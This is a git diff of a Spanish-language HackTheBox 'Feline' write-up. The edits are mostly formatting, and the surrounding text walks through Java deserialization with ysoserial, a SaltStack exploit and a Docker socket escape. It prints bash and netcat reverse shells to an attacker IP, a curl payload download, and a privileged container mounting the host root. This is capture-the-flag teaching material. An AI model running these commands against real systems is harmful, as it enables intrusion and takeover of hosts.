@@ -3,6 +3,7 @@ layout      : post
 title       : "HackTheBox - Feline"
 image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/feline/274banner.png
 categories  : [ htb ]
+tags        : [ docker, serialization, demon ]
 ---
 Máquina Linux nivel difícil. Beleza irmão! De cabezota nos encontraremos con serialización de objetos, enumeraremos y enumeraremos. Jugamos con los servicios que está corriendo **Docker** localmente y explotamos SaltStack. Pivotearemos entre containers rompiendo el demonio Docker.sock
 
@@ -26,13 +27,13 @@ Curiosamente el archivo `.bash_history` va a tener contenido, lo que nos permita
 
 ...
 
-1. [Enumeración](#enumeración).
-2. [Explotación](#explotación).
+1. [Enumeración](#enumeracion).
+2. [Explotación](#explotacion).
 3. [Escalada de privilegios](#escalada-de-privilegios).
 
 ...
 
-## Enumeración [#](#enumeración) {#enumeración}
+## Enumeración [#](#enumeracion) {#enumeracion}
 
 Como siempre empezamos realizando un escaneo de puertos sobre la maquina para saber que servicios esta corriendo.
 
@@ -47,7 +48,7 @@ Como siempre empezamos realizando un escaneo de puertos sobre la maquina para sa
 | -v         | Permite ver en consola lo que va encontrando                                                             |
 | -oG        | Guarda el output en un archivo con formato grepeable para usar una [función](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard      |
 
-```sh
+```bash
 –» cat initScan 
 # Nmap 7.80 scan initiated Wed Dec 16 25:25:25 2020 as: nmap -p- --open -v -oG initScan 10.10.10.205
 # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
@@ -65,7 +66,7 @@ Muy bien, ¿que tenemos?
 
 Hagamos nuestro escaneo de scripts y versiones en base a cada puerto, con ello obtenemos informacion mas detallada de cada servicio:
 
-```sh
+```bash
 –» nmap -p 22,8080 -sC -sV 10.10.10.205 -oN portScan
 ```
 
@@ -76,7 +77,7 @@ Hagamos nuestro escaneo de scripts y versiones en base a cada puerto, con ello o
 | -sV       | Nos permite ver la versión del servicio                |
 | -oN       | Guarda el output en un archivo                         |
 
-```sh
+```bash
 –» cat portScan 
 # Nmap 7.80 scan initiated Wed Dec 16 25:25:25 2020 as: nmap -p 22,8080 -sC -sV -oN portScan 10.10.10.205
 Nmap scan report for 10.10.10.205
@@ -152,7 +153,7 @@ La mayoría de la info la pueden encontrar acá:
 
 ...
 
-## Explotación [#](#explotación) {#explotación}
+## Explotación [#](#explotacion) {#explotacion}
 
 Perfecto, pues enumerando aún más encontré un PoC donde explica como subir varios objetos serializados para finalmente conseguir una reverse Shell:
 
@@ -167,7 +168,7 @@ Los pasos que debemos seguir son sencillos y fáciles de entender:
 
 Démosle:
 
-```sh
+```bash
 –» cat ejeje.sh 
 #!/bin/bash
 
@@ -176,7 +177,7 @@ bash -c "bash -i >& /dev/tcp/10.10.14.152/4433 0>&1"
 
 Ahora creamos los objetos serializados, usaremos la misma herramienta que él, [**ysoserial**](https://github.com/frohoff/ysoserial#installation).
 
-```sh
+```bash
 #Lo subimos a la maquina y lo guardamos en la ruta /tmp/ejeje.sh
 –» java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections2 'curl http://10.10.14.152:8000/ejeje.sh -o /tmp/ejeje.sh' > downloadPayload.session
 #Le damos permisos totales
@@ -185,14 +186,14 @@ Ahora creamos los objetos serializados, usaremos la misma herramienta que él, [
 –» java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections2 'bash /tmp/ejeje.sh' > executePayload.session
 ```
 
-```sh
+```bash
 –» ls
 chmodPayload.session  downloadPayload.session  ejeje.sh  executePayload.session  ysoserial-master-6eca5bc740-1.jar
 ```
 
 El creador del post crea un script para hacer las peticiones, vamos a copiarnos pero cambiando algunas cositas:
 
-```sh
+```bash
 –» cat todotaskbro.sh 
 #!/bin/bash
 
@@ -225,12 +226,12 @@ La forma de la petición coincide en varios ítems, solo modificaremos el header
 
 Levantemos un servidor web rápidamente con `Python`, pongámonos en escucha por medio de `netcat` y ejecutemos `todotaskbro.sh`:
 
-```sh
+```bash
 –» python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
-```sh
+```bash
 –» nc -nlvp 4433
 listening on [any] 4433 ...
 ```
@@ -241,7 +242,7 @@ Ahora si ejecutemos:
 
 Pues nos indica que se ha subido el archivo (pero no obtenemos peticiones en nuestro servidor de Python) pero cuando lo intenta ejecutar nos dice `Invalid Request`... Probemos con la ruta que tenía el script original:
 
-```sh
+```bash
 ...
 route_upload="../../../opt/samples/uploads"
 ...
@@ -265,7 +266,7 @@ Haciendo un tratamiento de la TTY podemos obtener una Shell completamente intera
 
 Enumerando y enumerando encontré algunas cosas interesantes; `puertos locochones` corriendo localmente:
 
-```sh
+```bash
 tomcat@VirusBucket:~$ netstat -l
 Active Internet connections (only servers)
 Proto Recv-Q Send-Q Local Address           Foreign Address         State
@@ -278,7 +279,7 @@ tcp        0      0 localhost:8000          0.0.0.0:*               LISTEN
 
 Tenemos `docker` corriendo en la maquina:
 
-```sh
+```bash
 tomcat@VirusBucket:~$ ifconfig
 ...
 docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
@@ -294,7 +295,7 @@ docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
 
 Revisemos el estado del servicio con `systemctl`:
 
-```sh
+```bash
 tomcat@VirusBucket:~$ systemctl status docker
 ● docker.service - Docker Application Container Engine
      Loaded: loaded (/lib/systemd/system/docker.service; enabled; vendor preset: enabled)
@@ -324,7 +325,7 @@ Pues al ver eso no le preste atención y mientras que investigaba ya tenía en m
 
 El `Remote Port Forwarding` lo realicé con `SSH`, en el caso del puerto `8000` sería así:
 
-```sh
+```bash
 tomcat@VirusBucket:~$ ssh -R 8000:127.0.0.1:8000 root@10.10.14.152 -p 177
 ```
 
@@ -359,7 +360,7 @@ Entonces lo primero que debemos hacer es hacer un `Remote Port Forwarding` de lo
 
 En nuestra máquina validamos que tenemos sobre ese puerto:
 
-```sh
+```bash
 –» lsof -i:4505
 ✗ ••• bAd •••· ~/sec/htb/feline/exploit
 –» 
@@ -367,13 +368,13 @@ En nuestra máquina validamos que tenemos sobre ese puerto:
 
 Hacemos el forwarding:
 
-```sh
+```bash
 tomcat@VirusBucket:~$ ssh -R 4505:127.0.0.1:4505 root@10.10.14.152 -p 177
 ```
 
 Y volvemos a validar a ver si ya tenemos el servicio en nuestra maquina:
 
-```sh
+```bash
 –» lsof -i:4505
 COMMAND    PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
 sshd    164674 root    9u  IPv6 839839      0t0  TCP localhost:4505 (LISTEN)
@@ -384,7 +385,7 @@ La ejecución de los exploits también me llevo un poco entenderlo y básicament
 
 Pongámonos en escucha por el puerto `4434` de una :P
 
-```sh
+```bash
 –» nc -nlvp 4434
 listening on [any] 4434 ...
 ```
@@ -407,7 +408,7 @@ def main():
     args = parser.parse_args()
 ```
 
-```sh
+```bash
 –» python3 exploit.py --port 4505 --exec 'bash -c "bash -i >& /dev/tcp/10.10.14.218/4434 0>&1"'
 [!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
 [+] Checking salt-master (127.0.0.1:4505) status... OFFLINE
@@ -424,13 +425,13 @@ Lindo lindo, obtenemos una shell sobre el contenedor del puerto `4506`, hacemos 
 * Tenemos un archivo `todo.txt`.
 * Curioso que el archivo `.bash_history` tiene contenido.
 
-```sh
+```bash
 root@2d24bf61767c:~# cat todo.txt 
 - Add saltstack support to auto-spawn sandbox dockers through events.
 - Integrate changes to tomcat and make the service open to public.
 ```
 
-```sh
+```bash
 root@2d24bf61767c:~# cat .bash_history
 paswd
 passwd
@@ -486,7 +487,7 @@ Lo que quiere decir que estamos ejecutando peticiones como usuario administrador
 
 Con esto en mente y entendiendo que hace, pues retomemos lo que encontramos en el archivo `.bash_history`:
 
-```sh
+```bash
 root@2d24bf61767c:~# curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
 ```
 
@@ -529,7 +530,7 @@ Tenemos únicamente la imagen de `sandbox`, veamos que contenedores hay:
 
 > Las imagenes Docker son plantillas (que incluyen una aplicación, los binarios y las librerias necesarias) que se utilizan para construir contenedores `Docker`. [ElTallerdelBit](https://eltallerdelbit.com/imagenes-docker/)
 
-```sh
+```bash
 root@2d24bf61767c:~# curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
 ```
 
@@ -618,7 +619,7 @@ Encontramos varias maneras con las cuales podemos romperlo. Podemos usar la opci
 * [Riesgos al tener el demonio `/var/run/docker.sock` accesible - Stackoverflow.com](https://stackoverflow.com/questions/40844197/what-is-the-docker-security-risk-of-var-run-docker-sock).
 * [Peligros de exponer el demonio `docker.sock` - Dejandayoff.com](https://dejandayoff.com/the-danger-of-exposing-docker.sock/).
 
-```sh
+```bash
 root@2d24bf61767c:~# curl -i -s --unix-socket /var/run/docker.sock -X POST -H "Content-Type: application/json" --data-binary '{"AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Cmd": ["cat", "/etc/passwd"],"DetachKeys": "ctrl-p,ctrl-q","Privileged": true,"Tty": true}' http://localhost/containers/2d24bf61767ce2a7a78e842ebc7534db8eb1ea5a5ec21bb735e472332b8f9ca2/exec
 HTTP/1.1 201 Created
 Api-Version: 1.40
@@ -634,7 +635,7 @@ Content-Length: 74
 
 Con lo anterior creamos un ID para esa tarea `exec` que queremos ejecutar, así que ahora le indicamos que nos lo ejecute:
 
-```sh
+```bash
 root@2d24bf61767c:~# curl -i -s --unix-socket /var/run/docker.sock -X POST -H 'Content-Type: application/json' --data-binary '{"Detach": false,"Tty": false}' http://localhost/exec/eff6b5d22c4b640f022d8f98b253a314b0a7cda0669ca1581d6916060d8dabdc/start
 HTTP/1.1 200 OK
 Content-Type: application/vnd.docker.raw-stream
@@ -662,7 +663,7 @@ Este último tiene varios links también de apoyo con lindas referencias, mirare
 
 En él nos muestra como obtener ejecución de comandos mediante la creación de un contenedor además de hacer una montura sobre la carpeta que le indiquemos; nosotros usaremos la imagen de `sandbox` para la creación del contenedor:
 
-```sh
+```bash
 root@2d24bf61767c:~# curl -i -s --unix-socket /var/run/docker.sock -X POST -H "Content-Type: application/json" http://localhost/containers/create?name=entramosOno -d '{"Image":"sandbox", "Cmd":["/usr/bin/nc", "10.10.14.218", "4435", "-e", "/bin/sh"], "Binds": [ "/:/montadoPA" ], "Privileged": true}'
 ```
 
@@ -674,7 +675,7 @@ Démosle:
 
 Perfecto, obtenemos la shell, veamos si tenemos la montura:
 
-```sh
+```bash
 ls -la /
 total 68
 drwxr-xr-x    1 root     root          4096 Dec 23 00:45 .
@@ -702,7 +703,7 @@ drwxr-xr-x   12 root     root          4096 May 29  2020 var
 
 Montado PAAAAAAA:
 
-```sh
+```bash
 ls -la /root     
 total 8
 drwx------    2 root     root          4096 May 29  2020 .
@@ -727,7 +728,7 @@ drwxr-xr-x    3 root     root          4096 May 18  2020 snap
 
 El único "problema" que veo es que no puedo ponerme una linda shell:
 
-```sh
+```bash
 # valid login shells
 /bin/sh
 /bin/ash
